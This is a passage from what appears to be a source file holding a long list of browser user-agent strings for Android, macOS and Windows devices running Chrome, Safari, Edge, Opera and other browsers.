    'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A716B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F721N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F936N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F936N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 EdgA/107.0.1418.35',
    'Mozilla/5.0 (Linux; Android 12; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G990E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 EdgA/107.0.1418.43',
    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N975W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S901E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S901N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; V2203) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; vivo 1920) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; LE2123) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.91 Mobile Safari/537.36 OPR/73.0.3788.68491',
    'Mozilla/5.0 (Linux; Android 13; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; Archos 97c Platinum) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; A0001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; LG-H870DS Build/OPR1.170623.032) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; MHA-AL00 Build/HUAWEIMHA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 BingWeb/6.9.6',
    'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; TECNO CA8S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; INE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; MRD-LX1F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 EdgA/96.0.1054.53',
    'Mozilla/5.0 (Linux; Android 9; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Y2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SM-G950N Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.232 Whale/1.0.0.0 Crosswalk/26.90.3.33 Mobile Safari/537.36 NAVER(inapp; search; 1010; 11.17.3)',
    'Mozilla/5.0 (Linux; Android 9; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; T5 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.1.75.00 SA/3 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 11; en-us; RMX3231 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/7.5.9',
    'Mozilla/5.0 (Linux; U; Android 8.0.0; zh-cn; Mi Note 2 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2408 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1079 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1081 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1145 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1146 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 05)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2408 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2410 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.114 Whale/3.17.145.12 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.24',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.28',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.149 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.158 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.5.710 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition std-1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
